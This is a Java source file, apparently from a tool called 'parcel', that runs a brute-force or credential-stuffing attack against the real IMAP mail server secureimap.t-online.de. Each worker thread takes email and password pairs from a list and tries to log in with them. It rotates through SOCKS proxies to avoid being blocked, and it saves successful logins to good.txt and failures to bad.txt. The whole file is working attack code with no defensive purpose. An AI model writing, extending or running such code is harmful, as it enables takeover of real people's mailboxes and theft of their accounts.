package org.bsoftware.parcel.domain.runnables;

import com.chilkatsoft.CkImap;
import com.chilkatsoft.CkString;
import lombok.RequiredArgsConstructor;
import lombok.Setter;
import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
import org.bsoftware.parcel.domain.components.DataContainer;
import org.bsoftware.parcel.domain.components.LogView;
import org.bsoftware.parcel.domain.model.DataType;
import org.bsoftware.parcel.domain.model.Proxy;
import org.bsoftware.parcel.domain.model.Source;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousFileChannel;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;

/**
 * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
 *
 * @author Rudolf Barbu
 * @version 1.0.1
 */
@RequiredArgsConstructor
public class BruteForceRunnable implements Runnable
{
    /**
     * Use or not SSL and TLS
     */
    private static final boolean SSL_AND_TLS = Boolean.TRUE;

    /**
     * IMAP server port
     */
    private static final short IMAP_PORT = 993;

    /**
     * Connection timeout
     */
    private static final byte CONNECTION_TIMEOUT = 5;

    /**
     * Socks version
     */
    private static final byte SOCKS_VERSION = 5;

    /**
     * IMAP server host link
     */
    private static final String IMAP_SERVER = "secureimap.t-online.de";

    /**
     * Directory, where result files will be created
     */
    @Setter
    private static Path workingDirectory;

    /**
     * Indicator for proxy usage
     */
    @Setter
    private static boolean useProxies;

    /**
     * Callback interface, which is used to deliver messages to service
     */
    private final BruteForceCallback bruteForceCallback;

    /**
     * Main method of brute-force algorithm
     */
    @Override
    public void run()
    {
        final CkImap ckImap = new CkImap();

        ckImap.put_Ssl(SSL_AND_TLS);
        ckImap.put_StartTls(SSL_AND_TLS);
        ckImap.put_Port(IMAP_PORT);

        if (useProxies)
        {
            ckImap.put_ConnectTimeout(CONNECTION_TIMEOUT);
            ckImap.put_SocksVersion(SOCKS_VERSION);
        }

        try
        {
            Source source;
            while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
            {
                if (useProxies && failedToConnect(ckImap))
                {
                    break;
                }
                else
                {
                    ckImap.Connect(IMAP_SERVER);
                }

                saveSourceToFile(source, ckImap.Login(source.getCredential(), source.getPassword()));
                bruteForceCallback.handleDecrementCounter(DataType.SOURCE);

                ckImap.Disconnect();
            }
        }
        catch (final IOException exception)
        {
            bruteForceCallback.handleBruteForceMessage(LogView.LogLevel.ERROR, String.format("Exception occurred, while saving source to file, clause: %s", exception.getCause().getMessage()));
        }

        bruteForceCallback.handleThreadTermination();
    }

    /**
     * Saving source object to result file
     *
     * @param source - data to save in-to file
     * @param isLogged - Based on this flag, it is decided in which file to save the data
     * @throws IOException if method can't create file or directory
     */
    private static synchronized void saveSourceToFile(final Source source, final boolean isLogged) throws IOException
    {
        if (workingDirectory == null)
        {
            throw new IOException("Working directory cannot be null");
        }

        final Path pathToFile = workingDirectory.resolve(String.format("%s.txt", isLogged ? "good" : "bad"));

        try (final AsynchronousFileChannel asynchronousFileChannel = AsynchronousFileChannel.open(pathToFile, StandardOpenOption.CREATE, StandardOpenOption.WRITE))
        {
            asynchronousFileChannel.write(ByteBuffer.wrap(String.format("%s:%s%n", source.getCredential(), source.getPassword()).getBytes()), asynchronousFileChannel.size());
        }
    }

    /**
     * Get new proxy until they available
     *
     * @param ckImap - imap object to probe connection
     * @return true, when cannot connect to imap server
     */
    private boolean failedToConnect(final CkImap ckImap)
    {
        final CkString currentProxyHostname = new CkString();

        ckImap.get_SocksHostname(currentProxyHostname);
        if (!currentProxyHostname.getString().isEmpty() && ckImap.Connect(IMAP_SERVER))
        {
            return Boolean.FALSE;
        }

        Proxy proxy;
        while (((proxy = DataContainer.getNextProxy()) != null) && !Thread.currentThread().isInterrupted())
        {
            ckImap.put_SocksHostname(proxy.getIpAddress());
            ckImap.put_SocksPort(proxy.getPort());
            bruteForceCallback.handleDecrementCounter(DataType.PROXY);

            if (ckImap.Connect(IMAP_SERVER))
            {
                return Boolean.FALSE;
            }
        }

        return Boolean.TRUE;
    }
}